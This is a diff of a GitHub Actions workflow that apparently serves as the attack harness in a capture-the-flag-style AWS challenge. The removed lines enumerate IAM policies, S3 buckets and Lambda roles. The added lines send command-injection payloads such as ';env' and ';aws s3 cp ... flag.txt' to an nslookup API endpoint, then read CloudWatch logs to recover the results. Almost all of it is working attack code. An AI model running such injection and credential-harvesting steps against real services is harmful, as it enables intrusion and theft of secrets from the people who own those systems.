@@ -15,61 +15,50 @@ jobs:
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
+
       - name: AWS identity
         run: aws sts get-caller-identity
-      - name: What can cicdRole actually do?
+
+      - name: Try direct flag read with cicdRole first (cheap check)
         run: |
-          echo "===== ATTACHED POLICIES ====="
-          aws iam list-attached-role-policies --role-name cicdRole || true
-          echo "===== INLINE POLICIES ====="
-          aws iam list-role-policies --role-name cicdRole || true
-          for p in $(aws iam list-role-policies --role-name cicdRole --query 'PolicyNames[]' --output text 2>/dev/null); do
-            echo "--- inline policy: $p ---"
-            aws iam get-role-policy --role-name cicdRole --policy-name "$p" || true
-          done
-          for arn in $(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null); do
-            echo "--- managed policy: $arn ---"
-            ver=$(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text)
-            aws iam get-policy-version --policy-arn "$arn" --version-id "$ver" || true
-          done
-      - name: Full recursive S3 listing (not just top-level)
+          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || echo "cicdRole cannot read flag.txt directly"
+
+      - name: Trigger nslookup injection (no space needed before ;)
         run: |
-          echo "===== RECURSIVE LISTING ====="
-          aws s3api list-objects-v2 --bucket codec4f26c862a321ef5 --output json || true
-          echo "===== BUCKET POLICY ====="
-          aws s3api get-bucket-policy --bucket codec4f26c862a321ef5 || true
-          echo "===== BUCKET ACL ====="
-          aws s3api get-bucket-acl --bucket codec4f26c862a321ef5 || true
-      - name: List ALL buckets you might have access to
-        run: aws s3 ls || true
-      - name: Read loot file (raw, in case it's not plain text)
-        run: |
-          aws s3 cp s3://codec4f26c862a321ef5/loot.txt ./loot.txt || true
-          echo "---- hexdump ----"
-          xxd ./loot.txt || true
-          echo "---- strings ----"
-          strings ./loot.txt || true
-      - name: Full Lambda config incl. env vars
-        run: |
-          aws lambda get-function-configuration --function-name nslookupv2
-          echo "===== LAMBDA POLICY (resource policy) ====="
-          aws lambda get-policy --function-name nslookupv2 || true
-      - name: Lambda role permissions
-        run: |
-          ROLE_ARN=$(aws lambda get-function-configuration --function-name nslookupv2 --query 'Role' --output text)
-          ROLE_NAME=$(echo $ROLE_ARN | awk -F'/' '{print $NF}')
-          echo "Lambda role: $ROLE_NAME"
-          aws iam list-attached-role-policies --role-name "$ROLE_NAME" || true
-          aws iam list-role-policies --role-name "$ROLE_NAME" || true
-      - name: Test command injection in nslookup API
-        run: |
-          echo "===== baseline ====="
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"example.com"}'
           echo "===== injection: env ====="
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"example.com; env"}'
-          echo "===== injection: subshell env ====="
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"$(env)"}'
-          echo "===== injection: backtick env ====="
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"`env`"}'
-          echo "===== injection: aws s3 ls ====="
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup -H "Content-Type: application/json" -d '{"domain":"example.com; aws s3 ls"}'
+          curl -s -i -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";env"}'
+          echo
+          echo "===== injection: try reading flag via lambdaRole, write to /tmp ====="
+          curl -s -i -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt --region us-east-1"}'
+          echo
+          echo "===== injection: aws s3 ls to confirm command execution works at all ====="
+          curl -s -i -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" \
+            -d '{"domain":";aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1"}'
+
+      - name: Wait a moment for async log delivery
+        run: sleep 5
+
+      - name: Read Lambda CloudWatch logs (this is where output actually goes)
+        run: |
+          echo "===== log streams ====="
+          aws logs describe-log-streams \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --order-by LastEventTime --descending --limit 3 || true
+
+          LATEST=$(aws logs describe-log-streams \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --order-by LastEventTime --descending --limit 1 \
+            --query 'logStreams[0].logStreamName' --output text 2>/dev/null)
+
+          echo "Latest stream: $LATEST"
+
+          echo "===== log events ====="
+          aws logs get-log-events \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --log-stream-name "$LATEST" \
+            --limit 50 || true
